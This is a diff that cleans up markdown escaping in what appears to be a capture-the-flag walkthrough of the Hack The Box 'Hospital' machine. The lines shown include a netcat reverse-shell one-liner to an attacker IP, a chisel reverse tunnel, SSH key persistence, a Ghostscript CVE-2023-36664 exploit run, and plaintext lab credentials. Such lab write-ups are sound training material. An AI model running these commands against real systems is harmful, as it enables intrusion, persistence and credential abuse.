@@ -22,14 +22,14 @@ NMAP
 Add hospital.htb to /etc/hosts
 
 ```bash
-dirsearch -u <https://hospital.htb>
+dirsearch -u https://hospital.htb
 
 ```
 
 ![image3](../resources/97071f6b2a35431991fb05a0b506da95.png)
 
 ```bash
-dirsearch -u <http://hospital.htb:8080>
+dirsearch -u http://hospital.htb:8080
 
 ```
 
@@ -107,11 +107,13 @@ MySQL creds in config.php:
 - Upload chisel to the webserver
 
 - On Kali:
+
 ```bash
 ./chisel server -p 8888 --reverse
 
 ```
 - On target:
+
 ```bash
 ./chisel client 10.10.14.31:8888 R:socks
 
@@ -143,11 +145,13 @@ but it doesn't give us anymore access
 ![image20](../resources/68accd0f44cb4188a22b05e9cb504fab.png)
 
 - Send the shell to Kali:
+
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2\>&1\|nc 10.10.14.31 9000 \>/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.31 9000 >/tmp/f
 
 ```
 - Upload the exploit.sh to the webserver
+
 ```bash
 chmod +x exploit.sh
 
@@ -159,11 +163,12 @@ chmod +x exploit.sh
 ![image21](../resources/907b47f33c1046f4ab74e13d0a2260aa.png)
 
 **<u>Get SSH access and some persistence:</u>**
+
 ```bash
 ssh-keygen -t rsa -b 4096
 chmod 600 id_rsa
 cat id_rsa.pub
-echo "\<id_rsa.pub\>" \>\> authorized_keys
+echo "\<id_rsa.pub\>" >> authorized_keys
 
 ssh root@hospital.htb -i id_rsa
 ```
@@ -192,7 +197,7 @@ crackmapexec smb hospital.htb -u drwilliams -p 'qwe123!@#'
 We have Windows credentials
 
 - Logging into the webmail server with the credentials:
-<https://hospital.htb>
+https://hospital.htb
 
 
 ![image26](../resources/5995780827bd4e568e7b32457ecfc5ee.png)
@@ -212,11 +217,9 @@ He wants a .eps file that will be processed by GhostScript
 <https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection>
 
 ```bash
-git clone <https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection>
-
+git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
 cd CVE-2023-36664-Ghostscript-command-injection
-
-python3 CVE_2023_36664_exploit.py --generate --payload '\<powershell base64 payload\>' --filename new_design --extension eps
+python3 CVE_2023_36664_exploit.py --generate --payload '<powershell base64 payload>' --filename new_design --extension eps
 
 ```
 
@@ -233,6 +236,7 @@ python3 CVE_2023_36664_exploit.py --generate --payload '\<powershell base64 payl
 We are user **drbrown**
 
 - After gaining access with the phishing email:
+
 ```bash
 cat user.txt
 
@@ -241,11 +245,12 @@ cat user.txt
 
 ![image31](../resources/8ae503ebe1df46989886356724c38d62.png)
 
-**hospital\drbrown : chr!\$br0wn**
+**hospital\drbrown : chr!$br0wn**
 
 - RDP in:
+
 ```bash
-xfreerdp /u:drbrown /p:'chr!\$br0wn' /cert:ignore /v:hospital.htb /dynamic-resolution +clipboard
+xfreerdp /u:drbrown /p:'chr!$br0wn' /cert:ignore /v:hospital.htb /dynamic-resolution +clipboard
 
 ```
 
